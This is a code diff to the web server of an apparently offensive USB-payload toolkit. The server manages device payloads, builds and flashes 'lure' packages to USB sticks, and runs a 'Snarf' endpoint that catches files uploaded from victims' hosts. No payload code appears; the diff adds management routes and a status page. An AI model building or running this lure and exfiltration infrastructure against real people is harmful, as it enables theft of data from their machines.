@@ -5,6 +5,7 @@ Serves the web UI and exposes all TSK functionality via REST + WebSocket.
 """
 
 import asyncio
+import html
 import json
 import os
 import secrets
@@ -37,7 +38,10 @@ from dropper.lure_builder import (
     build_lure as lure_build,
     save_lure as lure_save,
     get_lure_package_files,
+    resolve_lure_package,
     index_user_lures,
+    rename_lure_package,
+    delete_lure_package,
 )
 from dropper.receiver import (
     save_snarf_file,
@@ -72,8 +76,6 @@ BRANDING_ASSETS = {
 # Active WebSocket connections for live updates
 _ws_clients: list[WebSocket] = []
 _main_loop: Optional[asyncio.AbstractEventLoop] = None
-_last_usb_ws_sig: Optional[tuple] = None
-
 # Session tokens: token -> username
 _tokens: dict[str, str] = {}
 
@@ -423,7 +425,21 @@ def _get_payload_db(device: str, username: str = "") -> list:
                 lure_cat["payloads"].extend(user_lures)
             else:
                 db = list(db) + [{"cat": "LURES", "payloads": user_lures}]
+        db = _sort_usb_payload_db(db)
     return db
+
+
+_USB_PAYLOAD_CAT_ORDER = (
+    "BUILT-INS",
+    "EXFILS",
+    "LURES",
+    "MY PAYLOADS",
+)
+
+
+def _sort_usb_payload_db(db: list) -> list:
+    order = {cat: i for i, cat in enumerate(_USB_PAYLOAD_CAT_ORDER)}
+    return sorted(db, key=lambda g: (order.get(g["cat"], 50), g["cat"]))
 
 @app.get("/api/payloads/{device}")
 async def get_payloads(device: str, username: str = Depends(require_auth)):
@@ -451,9 +467,21 @@ async def _read_file(path: str, username: str):
     except ValueError as e:
         return JSONResponse({"content": "", "error": str(e)}, status_code=403)
     try:
+        if flash_mod.is_binary_payload(resolved):
+            raw = resolved.read_bytes()
+            size = len(raw)
+            strings = flash_mod.extract_printable_strings(raw)
+            return {
+                "content": "",
+                "binary": True,
+                "binary_type": resolved.suffix.lstrip(".").upper() or "BIN",
+                "size": size,
+                "strings_preview": strings,
+                "path": str(resolved),
+            }
         with open(resolved, "r", errors="ignore") as f:
             content = f.read(16000)
-        return {"content": content, "path": str(resolved), "size": len(content)}
+        return {"content": content, "path": str(resolved), "size": len(content), "binary": False}
     except Exception as e:
         return JSONResponse({"content": "", "error": str(e)}, status_code=500)
 
@@ -764,8 +792,7 @@ async def websocket_endpoint(ws: WebSocket, token: str = ""):
         cfg_user = cfg_mod.load(username)
         initial_mounts = flash_mod.list_usb_mounts(cfg_user, force=True)
         await ws.send_json({"type": "usb_sticks", "data": initial_mounts})
-        global _last_usb_ws_sig
-        _last_usb_ws_sig = flash_mod.usb_mounts_signature(initial_mounts)
+        last_usb_sig = flash_mod.usb_mounts_signature(initial_mounts)
         tick = 0
         while True:
             await asyncio.sleep(2)
@@ -782,14 +809,14 @@ async def websocket_endpoint(ws: WebSocket, token: str = ""):
                     })
                 except Exception:
                     pass
-            # USB stick scan every ~10s, only broadcast when mount list changes
+            # USB stick scan every ~10s, only send when mount list changes (per connection)
             if tick % 5 == 0:
                 try:
                     cfg = cfg_mod.load(username)
-                    mounts = flash_mod.list_usb_mounts(cfg)
+                    mounts = flash_mod.list_usb_mounts(cfg, force=True)
                     sig = flash_mod.usb_mounts_signature(mounts)
-                    if sig != _last_usb_ws_sig:
-                        _last_usb_ws_sig = sig
+                    if sig != last_usb_sig:
+                        last_usb_sig = sig
                         await ws.send_json({"type": "usb_sticks", "data": mounts})
                 except Exception:
                     pass
@@ -898,11 +925,19 @@ async def dropper_lure_save(data: dict, username: str = Depends(require_auth)):
     if not artifacts:
         return JSONResponse({"error": "artifacts required"}, status_code=400)
     try:
-        paths = lure_save(username, artifacts, package_files=package_files)
+        paths, package_id = lure_save(
+            username,
+            artifacts,
+            package_files=package_files,
+            package_name=str(data.get("package_name") or "").strip(),
+            package_meta=data.get("package_meta") or {},
+        )
         return {
             "ok": True,
             "paths": [str(p) for p in paths],
             "filenames": [p.name for p in paths],
+            "package_id": package_id,
+            "package_files": get_lure_package_files(username, package_id),
         }
     except ValueError as e:
         return JSONResponse({"error": str(e)}, status_code=400)
@@ -910,17 +945,57 @@ async def dropper_lure_save(data: dict, username: str = Depends(require_auth)):
         return JSONResponse({"error": str(e)}, status_code=500)
 
 
+@app.post("/api/dropper/lure/rename")
+async def dropper_lure_rename(data: dict, username: str = Depends(require_auth)):
+    package_id = (data.get("package_id") or "").strip()
+    name = (data.get("name") or "").strip()
+    if not package_id or not name:
+        return JSONResponse({"error": "package_id and name required"}, status_code=400)
+    try:
+        payload = rename_lure_package(username, package_id, name)
+        return {"ok": True, "payload": payload}
+    except ValueError as e:
+        return JSONResponse({"error": str(e)}, status_code=400)
+
+
+@app.post("/api/dropper/lure/delete-package")
+async def dropper_lure_delete_package(data: dict, username: str = Depends(require_auth)):
+    package_id = (data.get("package_id") or "").strip()
+    if not package_id:
+        return JSONResponse({"error": "package_id required"}, status_code=400)
+    try:
+        count = delete_lure_package(username, package_id)
+        return {"ok": True, "deleted_files": count}
+    except ValueError as e:
+        return JSONResponse({"error": str(e)}, status_code=400)
+
+
 @app.get("/api/dropper/lure/package-files")
-async def dropper_lure_package_files(lure: str = "", username: str = Depends(require_auth)):
-    if not lure:
-        return JSONResponse({"error": "lure filename required"}, status_code=400)
-    files = get_lure_package_files(username, lure)
-    return {"ok": True, "filenames": files}
+async def dropper_lure_package_files(
+    lure: str = "", package_id: str = "", username: str = Depends(require_auth)
+):
+    key = (package_id or lure or "").strip()
+    if not key:
+        return JSONResponse({"error": "lure or package_id required"}, status_code=400)
+    files = get_lure_package_files(username, key)
+    pkg = resolve_lure_package(username, key)
+    return {
+        "ok": True,
+        "filenames": files,
+        "package_id": (pkg or {}).get("slug", ""),
+    }
 
 
 @app.post("/api/dropper/lure/flash")
 async def dropper_lure_flash(data: dict, username: str = Depends(require_auth)):
     filenames = data.get("filenames") or []
+    package_id = (data.get("package_id") or "").strip()
+    if package_id:
+        resolved = get_lure_package_files(username, package_id)
+        if resolved:
+            filenames = resolved
+    if not filenames and package_id:
+        return JSONResponse({"error": "Lure package not found or empty"}, status_code=404)
     extra = {
         "usb_deploy": data.get("usb_deploy", "root"),
         "usb_mount_path": data.get("usb_mount_path", ""),
@@ -969,6 +1044,50 @@ async def dropper_lure_flash(data: dict, username: str = Depends(require_auth)):
 # ─────────────────────────────────────────────────────────────────────────────
 #  Routes — Snarf receiver (phone-home catch)
 # ─────────────────────────────────────────────────────────────────────────────
+
+def _snarf_status_payload() -> dict:
+    return {
+        "ok": True,
+        "endpoint": "/api/snarf",
+        "method": "POST",
+        "message": "TSK Snarf catch endpoint is listening. Exfil scripts POST uploads here (multipart or JSON).",
+        "storage": "snarfed/<operator>/<timestamp>/<hostname>/",
+    }
+
+
+@app.get("/api/snarf")
+async def snarf_status(request: Request):
+    """Browser-friendly status for the phone-home URL (victims use POST)."""
+    accept = (request.headers.get("accept") or "").lower()
+    if "text/html" in accept and "application/json" not in accept:
+        body = _snarf_status_payload()
+        storage = html.escape(body["storage"])
+        msg = html.escape(body["message"])
+        html_doc = f"""<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>TSK | Snarf catch</title>
+<style>
+  body{{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
+    font-family:Consolas,"Share Tech Mono",monospace;background:#060610;color:#c8c8e0;padding:24px;}}
+  .card{{max-width:520px;border:1px solid #34345a;border-radius:6px;padding:28px 32px;
+    background:#0c0c18;box-shadow:0 0 40px rgba(0,0,0,0.6);}}
+  h1{{font-size:14px;letter-spacing:3px;color:#00ff88;margin:0 0 16px;font-weight:700;}}
+  p{{font-size:14px;line-height:1.6;margin:0 0 12px;color:#c8c8e0;}}
+  .ok{{color:#00ff88;font-size:15px;margin-bottom:18px;}}
+  code{{background:rgba(0,229,255,0.08);padding:2px 6px;border-radius:3px;color:#f2f2ff;}}
+  .dim{{color:#9090b0;font-size:13px;margin-top:18px;}}
+</style></head><body>
+<div class="card">
+  <h1>TSK | SNARF CATCH</h1>
+  <p class="ok">● Endpoint is up and listening</p>
+  <p>{msg}</p>
+  <p>Method: <code>POST</code> only · Storage: <code>{storage}</code></p>
+  <p class="dim">Reachability check only. Exfil scripts POST file data here; a browser visit does not upload catches or show the CATCH file browser. Use SNARF → CATCH in the TSK web UI to review uploads.</p>
+</div></body></html>"""
+        return HTMLResponse(html_doc)
+    return _snarf_status_payload()
+
 
 @app.post("/api/snarf")
 async def snarf_receive(
@@ -1134,8 +1253,10 @@ async def save_payload(data: dict, username: str = Depends(require_auth)):
         pass
     try:
         import shutil
-        backup = str(resolved) + ".bak"
-        shutil.copy2(resolved, backup)
+        backup = ""
+        if resolved.is_file():
+            backup = str(resolved) + ".bak"
+            shutil.copy2(resolved, backup)
         with open(resolved, "w", encoding="utf-8") as f:
             f.write(content)
         return {"ok": True, "path": str(resolved), "backup": backup,
@@ -1187,10 +1308,75 @@ async def create_payload(data: dict, username: str = Depends(require_auth)):
     else:
         lang = lang_map.get(device, "TXT")
     payload = {
-        "name": dest.stem.replace("_", " ").title(),
+        "name": dest.stem.replace("_", " "),
         "file": dest.name,
         "path": str(dest),
         "cat": "MY PAYLOADS",
+        "tags": tags,
+        "lang": lang,
+        "desc": desc,
+        "operator_owned": True,
+    }
+    return {"ok": True, "payload": payload}
+
+
+@app.post("/api/payload/rename")
+async def rename_payload(data: dict, username: str = Depends(require_auth)):
+    path = (data.get("path") or "").strip()
+    new_name = (data.get("name") or "").strip()
+    if not path or not new_name:
+        return JSONResponse({"error": "path and name required"}, status_code=400)
+    if not is_user_payload_path(path, username):
+        return JSONResponse(
+            {"error": "Only operator-owned payloads under MY PAYLOADS can be renamed"},
+            status_code=403,
+        )
+    try:
+        resolved = safe_path(path, username=username, must_exist=True)
+    except ValueError as e:
+        return JSONResponse({"error": str(e)}, status_code=403)
+
+    norm = str(resolved).replace("\\", "/")
+    if "/payloads/usb/packages/" in norm or "/payloads/" in norm and "/packages/" in norm:
+        return JSONResponse(
+            {"error": "Lure package files cannot be renamed individually - use REN on the LURES list row"},
+            status_code=403,
+        )
+
+    import re
+    stem = re.sub(r"[^\w.\-]+", "_", new_name.strip())[:48].strip("._") or "payload"
+    ext = resolved.suffix
+    if ext and not stem.lower().endswith(ext.lower()):
+        new_filename = stem + ext
+    else:
+        new_filename = stem
+    dest = (resolved.parent / new_filename).resolve()
+    if not str(dest).startswith(str(resolved.parent.resolve())):
+        return JSONResponse({"error": "Invalid filename"}, status_code=400)
+    if dest.exists() and dest != resolved:
+        return JSONResponse({"error": f"File already exists: {new_filename}"}, status_code=409)
+    try:
+        resolved.rename(dest)
+    except OSError as e:
+        return JSONResponse({"error": str(e)}, status_code=500)
+
+    device = dest.parent.name
+    desc, tags = repo_mod._parse_payload_header(dest, device)
+    lang_map = {"ducky": "DS1", "bunny": "BB", "turtle": "LT", "teensy": "ARD", "usb": "PY"}
+    ext_l = dest.suffix.lower()
+    if ext_l == ".ps1":
+        lang = "PS1"
+    elif ext_l == ".sh":
+        lang = "SH"
+    elif ext_l == ".hex":
+        lang = "ARD"
+    else:
+        lang = lang_map.get(device, "TXT")
+    payload = {
+        "name": dest.stem.replace("_", " "),
+        "file": dest.name,
+        "path": str(dest),
+        "cat": "EXFILS" if device == "usb" and repo_mod._is_snarf_usb_file(dest) else "MY PAYLOADS",
         "tags": tags,
         "lang": lang,
         "desc": desc,
@@ -1213,6 +1399,12 @@ async def delete_payload(data: dict, username: str = Depends(require_auth)):
         resolved = safe_path(path, username=username, must_exist=True)
     except ValueError as e:
         return JSONResponse({"error": str(e)}, status_code=403)
+    norm = str(resolved).replace("\\", "/")
+    if "/packages/" in norm:
+        return JSONResponse(
+            {"error": "Delete the whole lure package from the LURES list instead"},
+            status_code=403,
+        )
     try:
         resolved.unlink()
         return {"ok": True, "path": str(resolved)}
